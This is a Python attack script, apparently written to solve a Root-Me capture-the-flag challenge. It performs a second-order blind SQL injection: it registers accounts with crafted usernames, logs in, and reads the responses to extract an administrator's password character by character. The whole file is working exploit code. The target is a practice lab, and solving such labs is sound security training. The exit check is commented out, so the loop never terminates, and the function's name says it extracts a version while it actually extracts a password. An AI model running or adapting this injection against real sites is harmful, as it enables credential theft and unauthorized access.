import requests

BASE_URL = "http://challenge01.root-me.org:59086"
PASSWORD = "Test1234!"

CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_"

def register_and_check(position: int, ascii_val: int) -> bool:
    """
    Crée un compte avec le payload, se connecte, et vérifie si Warning est présent.
    Retourne True si la condition est vraie.
    """
    payload  = f"'or+ascii(substring(password,{position},1))={ascii_val}&&+email='admin@rootme.com'#"
    username = payload
    email    = f"test{position}{ascii_val}@test.com"

    session = requests.Session()

    # 1. Inscription
    ae = session.post(f"{BASE_URL}/login_create.php", data={
        "username"   : username,
        "email"      : email,
        "password"   : PASSWORD,
        "re_password": PASSWORD,
        "submit"     : "Register",
    })
    #print(f"Body (données) : {ae.request.body}")
    #print()

    # 2. Connexion
    session.post(f"{BASE_URL}/login.php", data={
        "user"    : username,
        "password": PASSWORD,
        "submit"  : "Login",
    })

    # 3. Vérification
    r = session.get(f"{BASE_URL}/logged-in.php")
    #print(r.text)
    found = " admin@rootme.com" in r.text
    if found : print(r.text)
    

    #print(f"  Position {position} | ASCII {ascii_val:3d} ('{chr(ascii_val) if 32 <= ascii_val <= 126 else '?'}') → {'✓ VRAI' if found else '✗ faux'}")
    return found

def extract_version():
    print("=" * 50)
    print("  Extraction de version() caractère par caractère")
    print("=" * 50)

    version = ""
    position = 1

    while True:
        print(f"\n[*] Caractère n°{position} :")
        found_char = None

        for char in CHARSET:
            ascii_val = ord(char)
            if register_and_check(position, ascii_val):
                found_char = char
                break

        # if found_char is None:
        #     print(f"  → Fin de chaîne ou caractère hors charset (position {position})")
        #     break

        version += found_char
        print(f"\n  >>> Version jusqu'ici : {version}")
        position += 1

    print(f"\n[+] Version complète : {version}")

if __name__ == "__main__":
    extract_version()